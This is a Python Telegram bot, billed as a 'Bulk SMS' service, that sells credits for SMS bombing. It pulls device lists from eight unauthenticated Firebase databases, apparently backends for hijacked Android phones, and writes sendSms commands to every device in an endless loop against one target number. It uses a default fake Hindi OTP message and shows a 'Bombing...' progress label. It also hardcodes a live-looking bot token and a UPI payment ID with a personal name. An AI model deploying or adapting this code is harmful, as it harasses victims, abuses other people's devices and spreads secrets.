#!/usr/bin/env python3
# 🔥 BULK SMS BOT - RENDER DEPLOYMENT VERSION 🔥

import re
import os
import requests
import json
import sqlite3
import random
import string
import time
import asyncio
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, KeyboardButton, ReplyKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters

# ============================
# CONFIGURATION
# ============================
TOKEN = '8212356485:AAGQNG75v9YA1sryNfX6zSbEQgpWM_oYMHI'
OWNER_ID = 6346250222

FIREBASE_URLS = [
    "https://dusman-abf8b-default-rtdb.firebaseio.com",
    "https://hood-4ba1e-default-rtdb.firebaseio.com",
    "https://lucifer-spreader-default-rtdb.firebaseio.com",
    "https://totla-axis-default-rtdb.firebaseio.com",
    "https://rgggggggggg-e2547-default-rtdb.firebaseio.com",
    "https://bulbul8084-9a5df-default-rtdb.firebaseio.com",
    "https://systumm-c8526-default-rtdb.firebaseio.com",
    "https://ravan-98ef1-default-rtdb.firebaseio.com"
]

UPI_ID = "70497398@axl"
UPI_NAME = "BRAJENDRA TYAGI"

# ============================
# DATABASE SETUP (Render Compatible)
# ============================
# Create data directory for persistent storage
DATA_DIR = os.path.join(os.getcwd(), "data")
os.makedirs(DATA_DIR, exist_ok=True)
DB_PATH = os.path.join(DATA_DIR, "bot_data.db")

class PremiumEmoji:
    ROCKET = "6129639980387015660"
    FIRE = "6129792056589031358"
    CROWN = "6129705083501293112"
    DIAMOND = "6129736819014639296"
    STAR = "6129909635613726974"
    SPARKLE = "6129479035077531636"
    PARTY = "6129579803600231171"
    GIFT = "6131660826924292492"
    CHECK = "6129472184604695207"
    HEART = "6147617184479711380"
    BOLT = "6129805465476929485"
    CHART = "6129801569941592173"
    MONEY = "6129732880529628243"
    USER = "6129708236007283169"
    LEADER = "6129778965528713511"
    PLAN = "6129801569941592173"
    HELP = "6129903231817488942"
    ADMIN = "6129906126625447892"
    WARNING = "6129782440157256336"
    LOCK = "6129906126625447892"
    INFO = "6129903927602190764"
    CALENDAR = "6129779562529168023"
    LINK = "6129589862413638401"
    CONTACT = "6129708236007283169"
    CANCEL = "6129782440157256336"
    BOX = "6129589862413638401"
    SEARCH = "6129903231817488942"
    HISTORY = "6129801569941592173"
    RECEIPT = "6129732880529628243"
    ADD = "6129639980387015660"
    REMOVE = "6129782440157256336"
    SETTINGS = "6129906126625447892"
    FORWARD = "6129589862413638401"
    STOP = "6129782440157256336"

def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            credits INTEGER DEFAULT 5,
            referrer_id INTEGER,
            joined_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    c.execute('''
        CREATE TABLE IF NOT EXISTS banned_users (
            user_id INTEGER PRIMARY KEY,
            banned_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            banned_by INTEGER
        )
    ''')
    c.execute('''
        CREATE TABLE IF NOT EXISTS payments (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            amount INTEGER,
            credits_given INTEGER,
            transaction_id TEXT,
            screenshot_id TEXT,
            status TEXT DEFAULT 'pending',
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    c.execute('''
        CREATE TABLE IF NOT EXISTS user_history (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            action TEXT,
            details TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    conn.commit()
    conn.close()
    print(f"✅ Database initialized at: {DB_PATH}")

init_db()

# ============================
# DATABASE FUNCTIONS
# ============================
def is_owner(user_id):
    return user_id == OWNER_ID

def get_user_credits(user_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT credits FROM users WHERE user_id = ?", (user_id,))
    row = c.fetchone()
    conn.close()
    if row:
        return row[0]
    else:
        add_new_user(user_id)
        return 5

def add_new_user(user_id, referrer_id=None):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT user_id FROM users WHERE user_id = ?", (user_id,))
    if c.fetchone():
        conn.close()
        return
    c.execute("INSERT INTO users (user_id, credits, referrer_id) VALUES (?, ?, ?)",
              (user_id, 5, referrer_id))
    conn.commit()
    conn.close()
    if referrer_id and referrer_id != user_id:
        conn2 = sqlite3.connect(DB_PATH)
        c2 = conn2.cursor()
        c2.execute("SELECT credits FROM users WHERE user_id = ?", (referrer_id,))
        if c2.fetchone():
            c2.execute("UPDATE users SET credits = credits + 1 WHERE user_id = ?", (referrer_id,))
            conn2.commit()
        conn2.close()

def deduct_credit(user_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("UPDATE users SET credits = credits - 1 WHERE user_id = ? AND credits > 0", (user_id,))
    affected = c.rowcount
    conn.commit()
    conn.close()
    return affected > 0

def add_credits(user_id, amount):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("UPDATE users SET credits = credits + ? WHERE user_id = ?", (amount, user_id))
    conn.commit()
    conn.close()

def remove_credits(user_id, amount):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("UPDATE users SET credits = credits - ? WHERE user_id = ? AND credits >= ?", (amount, user_id, amount))
    affected = c.rowcount
    conn.commit()
    conn.close()
    return affected > 0

def ban_user(user_id, admin_id):
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("INSERT OR IGNORE INTO banned_users (user_id, banned_by) VALUES (?, ?)", (user_id, admin_id))
        conn.commit()
        conn.close()
        return True
    except:
        return False

def unban_user(user_id):
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("DELETE FROM banned_users WHERE user_id = ?", (user_id,))
        affected = c.rowcount
        conn.commit()
        conn.close()
        return affected > 0
    except:
        return False

def is_user_banned(user_id):
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("SELECT user_id FROM banned_users WHERE user_id = ?", (user_id,))
        row = c.fetchone()
        conn.close()
        return row is not None
    except:
        return False

def create_payment(user_id, amount, credits_given, transaction_id=None, screenshot_id=None):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''
        INSERT INTO payments (user_id, amount, credits_given, transaction_id, screenshot_id, status)
        VALUES (?, ?, ?, ?, ?, 'pending')
    ''', (user_id, amount, credits_given, transaction_id, screenshot_id))
    payment_id = c.lastrowid
    conn.commit()
    conn.close()
    return payment_id

def log_user_action(user_id, action, details=""):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''
        INSERT INTO user_history (user_id, action, details)
        VALUES (?, ?, ?)
    ''', (user_id, action, details))
    conn.commit()
    conn.close()

def get_user_history(user_id, limit=10):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''
        SELECT action, details, created_at
        FROM user_history
        WHERE user_id = ?
        ORDER BY id DESC
        LIMIT ?
    ''', (user_id, limit))
    rows = c.fetchall()
    conn.close()
    return rows

def get_referral_link(user_id, bot_username):
    return f"https://t.me/{bot_username}?start=ref_{user_id}"

# ============================
# HELPER FUNCTIONS
# ============================
def fetch_json_data(url, path, auth=None):
    try:
        base = url.rstrip('/')
        full_url = f"{base}/{path}.json"
        if auth and auth.strip():
            full_url += f"?auth={auth}"
        response = requests.get(full_url, timeout=10)
        if response.status_code == 200:
            return response.json()
        else:
            return None
    except:
        return None

def firebase_put(url, key, path, data):
    try:
        base = url.rstrip('/')
        full_url = f"{base}/{path}.json"
        if key and key.strip():
            full_url += f"?auth={key}"
        resp = requests.put(full_url, json=data, timeout=10)
        return resp.status_code in (200, 201)
    except:
        return False

def generate_otp(length=6):
    return ''.join(random.choices(string.digits, k=length))

def validate_phone_number(number):
    number = number.strip()
    if not number.startswith('+91'):
        return False, "❌ Number must start with +91"
    remaining = number[3:]
    if not remaining.isdigit():
        return False, "❌ Only digits allowed after +91"
    if len(remaining) != 10:
        return False, f"❌ Enter exactly 10 digits after +91 (you entered {len(remaining)})"
    return True, "✅ Valid number"

def get_main_keyboard():
    keyboard = [
        [KeyboardButton(
            text="📱 Bulk SMS",
            icon_custom_emoji_id=PremiumEmoji.ROCKET,
            style="primary"
        )],
        [
            KeyboardButton(
                text="💰 Credits",
                icon_custom_emoji_id=PremiumEmoji.MONEY,
                style="success"
            ),
            KeyboardButton(
                text="🔗 Referral",
                icon_custom_emoji_id=PremiumEmoji.LINK,
                style="primary"
            )
        ],
        [
            KeyboardButton(
                text="💳 Recharge",
                icon_custom_emoji_id=PremiumEmoji.DIAMOND,
                style="success"
            )
        ],
        [
            KeyboardButton(
                text="📜 My History",
                icon_custom_emoji_id=PremiumEmoji.HISTORY,
                style="primary"
            ),
            KeyboardButton(
                text="🛡️ System Status",
                icon_custom_emoji_id=PremiumEmoji.INFO,
                style="primary"
            )
        ],
        [
            KeyboardButton(
                text="👨‍💻 Developer",
                icon_custom_emoji_id=PremiumEmoji.ADMIN,
                style="danger"
            )
        ]
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

# ============================
# BOT HANDLERS
# ============================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if is_user_banned(user_id):
        await update.message.reply_text("❌ You are banned from using this bot.")
        return
    
    referrer_id = None
    if context.args and len(context.args) > 0:
        payload = context.args[0]
        if payload.startswith("ref_"):
            try:
                referrer_id = int(payload.split("_")[1])
            except:
                pass
    
    add_new_user(user_id, referrer_id)
    credits = get_user_credits(user_id)
    
    welcome = "⚡ **BULK SMS BOT** ⚡\n"
    welcome += "━─━────༺༻────━─━\n"
    welcome += f"🟢 **Status:** `ONLINE`\n"
    welcome += f"💰 **Credits:** `{credits}`\n"
    welcome += "━─━────༺༻────━─━\n"
    welcome += "📌 **How to use:**\n"
    welcome += "• Click `📱 Bulk SMS` and follow steps\n"
    welcome += "• Each SMS costs **1 credit**\n"
    welcome += "• Invite friends to earn free credits!\n"
    welcome += "• Recharge via `💳 Recharge`"
    
    await update.message.reply_text(
        welcome,
        parse_mode="HTML",
        reply_markup=get_main_keyboard()
    )

async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text
    
    if is_user_banned(user_id):
        await update.message.reply_text("❌ You are banned.")
        return
    
    bulk_step = context.user_data.get('bulk_step')
    recharge_step = context.user_data.get('recharge_step')
    
    if bulk_step == 'number':
        number = text.strip()
        valid, msg = validate_phone_number(number)
        if not valid:
            await update.message.reply_text(
                f"{msg}\n\n📞 Format: +91XXXXXXXXXX\nExample: +919876543210",
                parse_mode="HTML"
            )
            return
        context.user_data['bulk_number'] = number
        
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("🔢 Random OTP", callback_data="msgtype_random")],
            [InlineKeyboardButton("✏️ Custom SMS", callback_data="msgtype_custom")],
            [InlineKeyboardButton("❌ Cancel", callback_data="msgtype_cancel")]
        ])
        await update.message.reply_text("📝 **Select message type:**", reply_markup=keyboard)
        context.user_data['bulk_step'] = 'msgtype'
        return
    
    if bulk_step == 'custom_msg':
        msg_text = text
        if not msg_text:
            await update.message.reply_text("❌ Message cannot be empty.")
            return
        context.user_data['custom_message'] = msg_text
        
        if not deduct_credit(user_id):
            await update.message.reply_text("❌ Failed to deduct credit. Insufficient balance.")
            return
        
        log_user_action(user_id, "Bulk SMS Started", f"Target: {context.user_data['bulk_number']}")
        await update.message.reply_text("📤 **Starting infinite bulk SMS...**")
        await perform_bulk_send(update, context)
        return
    
    if recharge_step == 'payment':
        if update.message.photo:
            file_id = update.message.photo[-1].file_id
            credits = context.user_data.get('recharge_credits', 0)
            amount = context.user_data.get('recharge_amount', 0)
            if credits == 0:
                await update.message.reply_text("❌ Session expired. Start /start again.")
                return
            payment_id = create_payment(user_id, amount, credits, screenshot_id=file_id)
            await update.message.reply_text(f"✅ Screenshot received! Payment ID: #{payment_id}\n⏳ Waiting for owner approval.")
            try:
                await context.application.bot.send_message(
                    OWNER_ID,
                    f"📥 **New Payment Screenshot**\nUser: {user_id}\nAmount: ₹{amount}\nCredits: {credits}\nPayment ID: #{payment_id}"
                )
            except:
                pass
            log_user_action(user_id, "Recharge Request", f"{credits} credits for ₹{amount} (screenshot)")
            context.user_data.pop('recharge_step', None)
            context.user_data.pop('recharge_credits', None)
            context.user_data.pop('recharge_amount', None)
            return
        elif text and not text.startswith('/'):
            txn_id = text.strip()
            credits = context.user_data.get('recharge_credits', 0)
            amount = context.user_data.get('recharge_amount', 0)
            if credits == 0:
                await update.message.reply_text("❌ Session expired. Start /start again.")
                return
            payment_id = create_payment(user_id, amount, credits, transaction_id=txn_id)
            await update.message.reply_text(f"✅ Transaction ID received: `{txn_id}`\nPayment ID: #{payment_id}\n⏳ Waiting for owner approval.")
            try:
                await context.application.bot.send_message(
                    OWNER_ID,
                    f"📥 **New Payment (Txn ID)**\nUser: {user_id}\nAmount: ₹{amount}\nCredits: {credits}\nTxn: {txn_id}\nPayment ID: #{payment_id}"
                )
            except:
                pass
            log_user_action(user_id, "Recharge Request", f"{credits} credits for ₹{amount} (txn: {txn_id})")
            context.user_data.pop('recharge_step', None)
            context.user_data.pop('recharge_credits', None)
            context.user_data.pop('recharge_amount', None)
            return
        return
    
    if text == "📱 Bulk SMS":
        credits = get_user_credits(user_id)
        if credits <= 0:
            await update.message.reply_text(
                "❌ **Insufficient credits!**\nInvite friends or recharge.",
                parse_mode="HTML"
            )
            return
        await update.message.reply_text(
            "📞 **Enter recipient phone number:**\n"
            "✅ Format: +91XXXXXXXXXX (10 digits after +91)\n"
            "_Type /cancel to abort._",
            parse_mode="HTML"
        )
        context.user_data['bulk_step'] = 'number'
        return
    
    if text == "💰 Credits":
        credits = get_user_credits(user_id)
        await update.message.reply_text(f"💰 **Your Credits:** `{credits}`", parse_mode="HTML")
        return
    
    if text == "🔗 Referral":
        bot_username = (await context.application.bot.get_me()).username
        link = get_referral_link(user_id, bot_username)
        await update.message.reply_text(
            f"🔗 **Your Referral Link:**\n`{link}`\n\nShare this link – you get **1 credit** per new user!",
            parse_mode="HTML"
        )
        return
    
    if text == "💳 Recharge":
        markup = InlineKeyboardMarkup([
            [InlineKeyboardButton("💳 10 Credits - ₹20", callback_data="recharge_10_20")],
            [InlineKeyboardButton("💎 25 Credits - ₹50", callback_data="recharge_25_50")],
            [InlineKeyboardButton("🚀 50 Credits - ₹100", callback_data="recharge_50_100")],
            [InlineKeyboardButton("👑 100 Credits - ₹200", callback_data="recharge_100_200")],
            [InlineKeyboardButton("❌ Cancel", callback_data="recharge_cancel")]
        ])
        await update.message.reply_text("💳 **Select Recharge Plan:**", reply_markup=markup)
        return
    
    if text == "📜 My History":
        history = get_user_history(user_id, 10)
        if not history:
            await update.message.reply_text("📭 No activity history.")
            return
        reply = "📜 **Your Recent Activity:**\n"
        for action, details, created_at in history:
            dt = created_at[:19] if created_at else "N/A"
            reply += f"• {action} – {details} ({dt})\n"
        await update.message.reply_text(reply)
        return
    
    if text == "🛡️ System Status":
        await update.message.reply_text("🟢 **Bot is running on Render!**")
        return
    
    if text == "👨‍💻 Developer":
        await update.message.reply_text(
            "👨‍💻 **Developer:** @MAURYAHACKERISHERE\n"
            "For support or custom bots, contact the developer."
        )
        return
    
    await update.message.reply_text("❌ Please use the buttons below.")

async def handle_callbacks(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    data = query.data
    
    if data.startswith("recharge_"):
        if data == "recharge_cancel":
            await query.edit_message_text("❌ Recharge cancelled.")
            return
        _, credits, amount = data.split("_")
        credits = int(credits)
        amount = int(amount)
        context.user_data['recharge_credits'] = credits
        context.user_data['recharge_amount'] = amount
        reply = f"💰 **Plan: {credits} Credits**\n💵 **Amount: ₹{amount}**\n\n"
        reply += f"📱 **Send payment to UPI:** `{UPI_ID}`\n"
        reply += f"📛 **Name:** {UPI_NAME}\n\n"
        reply += "📸 **After payment, send the Transaction ID or screenshot** (as photo) to this chat.\n"
        reply += "⚠️ Your credits will be added after manual verification by owner."
        await query.edit_message_text(reply, parse_mode="HTML")
        context.user_data['recharge_step'] = 'payment'
        return
    
    if data.startswith("msgtype_"):
        if data == "msgtype_cancel":
            await query.edit_message_text("❌ Bulk SMS cancelled.")
            context.user_data.pop('bulk_step', None)
            return
        msg_type = data.split("_")[1]
        if msg_type == "random":
            default_msg = "आपका OTP है: {otp} | कृपया इसे किसी को न बताएँ।"
            context.user_data['custom_message'] = default_msg
            await query.edit_message_text("✅ Using default OTP template.\n\n📤 **Starting infinite bulk SMS...**")
            if not deduct_credit(user_id):
                await query.message.reply_text("❌ Failed to deduct credit. Insufficient balance.")
                return
            log_user_action(user_id, "Bulk SMS Started", f"Target: {context.user_data['bulk_number']}")
            await perform_bulk_send(update, context)
        else:
            await query.edit_message_text("✏️ **Now enter your custom message.**\n💡 Use `{otp}` for random OTP if needed.")
            context.user_data['bulk_step'] = 'custom_msg'
        return
    
    if data == "stop_bulk":
        context.user_data['stop_sending'] = True
        await query.answer("Stopping...")
        return

async def perform_bulk_send(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if is_user_banned(user_id):
        await update.message.reply_text("❌ You are banned.")
        return
    
    data = context.user_data
    number = data.get("bulk_number")
    msg_text = data.get("custom_message")
    if not number or not msg_text:
        await update.message.reply_text("❌ Missing data. Please start again.")
        return
    
    context.user_data['stop_sending'] = False
    stop_markup = InlineKeyboardMarkup([
        [InlineKeyboardButton("⏹ Stop Sending", callback_data="stop_bulk")]
    ])
    progress_msg = await update.message.reply_text("⏳ Starting...", reply_markup=stop_markup)
    
    total_sent = 0
    total_failed = 0
    cycle = 1
    
    otp_placeholder = re.search(r'\{otp(:\d+)?\}', msg_text)
    otp_length = 6
    if otp_placeholder and otp_placeholder.group(1):
        try:
            otp_length = int(otp_placeholder.group(1)[1:])
            if otp_length < 1: otp_length = 1
            if otp_length > 10: otp_length = 10
        except:
            otp_length = 6
    
    while not context.user_data.get('stop_sending', False):
        if is_user_banned(user_id):
            break
        
        cycle_text = f"🔄 Cycle #{cycle}"
        try:
            await progress_msg.edit_text(f"⏳ {cycle_text} - Sending...", reply_markup=stop_markup)
        except:
            pass
        
        for url in FIREBASE_URLS:
            if context.user_data.get('stop_sending', False) or is_user_banned(user_id):
                break
            
            base_url = url.rstrip('/')
            clients = fetch_json_data(base_url, "/clients", auth=None)
            if not clients or not isinstance(clients, dict):
                continue
            device_ids = list(clients.keys())
            if not device_ids:
                continue
            
            for dev_id in device_ids:
                if context.user_data.get('stop_sending', False) or is_user_banned(user_id):
                    break
                
                final_msg = msg_text
                if otp_placeholder:
                    otp = generate_otp(otp_length)
                    final_msg = re.sub(r'\{otp(:\d+)?\}', otp, msg_text)
                
                path = f"clients/{dev_id}/webhookEvent/sendSms"
                payload = {
                    "sim": 1,
                    "to": number,
                    "message": final_msg,
                    "isSended": False
                }
                ok = firebase_put(base_url, None, path, payload)
                if ok:
                    total_sent += 1
                else:
                    total_failed += 1
                
                if (total_sent + total_failed) % 10 == 0:
                    progress_text = f"📤 **Bombing...**\n{cycle_text}\n✅ Sent: {total_sent}\n❌ Failed: {total_failed}"
                    try:
                        await progress_msg.edit_text(progress_text, reply_markup=stop_markup)
                    except:
                        pass
                await asyncio.sleep(0.05)
        
        cycle += 1
        progress_text = f"📤 **Cycle {cycle-1} completed.**\n✅ Sent: {total_sent}\n❌ Failed: {total_failed}"
        try:
            await progress_msg.edit_text(progress_text, reply_markup=stop_markup)
        except:
            pass
        await asyncio.sleep(0.5)
    
    final_text = f"🛑 **Bulk SMS stopped.**\n✅ Sent: {total_sent}\n❌ Failed: {total_failed}"
    try:
        await progress_msg.edit_text(final_text)
        await progress_msg.edit_reply_markup(reply_markup=None)
    except:
        pass
    log_user_action(user_id, "Bulk SMS Ended", f"Sent {total_sent}, Failed {total_failed}")
    context.user_data.pop('stop_sending', None)

# ============================
# OWNER COMMANDS
# ============================
async def add_credits_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("⛔ Unauthorized.")
        return
    args = context.args
    if len(args) < 2:
        await update.message.reply_text("Usage: /addcredits <user_id> <amount>")
        return
    try:
        target = int(args[0])
        amount = int(args[1])
        add_credits(target, amount)
        await update.message.reply_text(f"✅ Added {amount} credits to user {target}.")
    except:
        await update.message.reply_text("❌ Invalid input.")

async def remove_credits_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("⛔ Unauthorized.")
        return
    args = context.args
    if len(args) < 2:
        await update.message.reply_text("Usage: /removecredits <user_id> <amount>")
        return
    try:
        target = int(args[0])
        amount = int(args[1])
        if remove_credits(target, amount):
            await update.message.reply_text(f"✅ Removed {amount} credits from user {target}.")
        else:
            await update.message.reply_text(f"❌ Failed. User may have insufficient credits.")
    except:
        await update.message.reply_text("❌ Invalid input.")

async def ban_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("⛔ Unauthorized.")
        return
    args = context.args
    if len(args) < 1:
        await update.message.reply_text("Usage: /ban <user_id>")
        return
    try:
        target = int(args[0])
        if ban_user(target, user_id):
            await update.message.reply_text(f"✅ User {target} banned.")
        else:
            await update.message.reply_text("❌ Failed to ban.")
    except:
        await update.message.reply_text("❌ Invalid user ID.")

async def unban_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("⛔ Unauthorized.")
        return
    args = context.args
    if len(args) < 1:
        await update.message.reply_text("Usage: /unban <user_id>")
        return
    try:
        target = int(args[0])
        if unban_user(target):
            await update.message.reply_text(f"✅ User {target} unbanned.")
        else:
            await update.message.reply_text("❌ User was not banned.")
    except:
        await update.message.reply_text("❌ Invalid user ID.")

async def shutdown(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("⛔ Unauthorized.")
        return
    await update.message.reply_text("🛑 Bot is shutting down...")
    await context.application.stop()
    os._exit(0)

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data.pop('bulk_step', None)
    context.user_data.pop('recharge_step', None)
    context.user_data.pop('stop_sending', None)
    await update.message.reply_text("❌ Cancelled. Use the buttons to start again.", reply_markup=get_main_keyboard())

# ============================
# MAIN
# ============================
def main():
    application = Application.builder().token(TOKEN).build()
    
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("cancel", cancel))
    
    application.add_handler(CommandHandler("addcredits", add_credits_cmd))
    application.add_handler(CommandHandler("removecredits", remove_credits_cmd))
    application.add_handler(CommandHandler("ban", ban_cmd))
    application.add_handler(CommandHandler("unban", unban_cmd))
    application.add_handler(CommandHandler("shutdown", shutdown))
    
    application.add_handler(CallbackQueryHandler(handle_callbacks))
    
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    application.add_handler(MessageHandler(filters.PHOTO, handle_text))
    
    print("""
╔════════════════════════════════════════════════╗
║  🚀 BULK SMS BOT - RENDER DEPLOYMENT          ║
║  ✅ Database: /data/bot_data.db                ║
║  ✅ Persistent Storage Enabled                 ║
║  ✅ Ready for Production!                      ║
╚════════════════════════════════════════════════╝
    """)
    
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
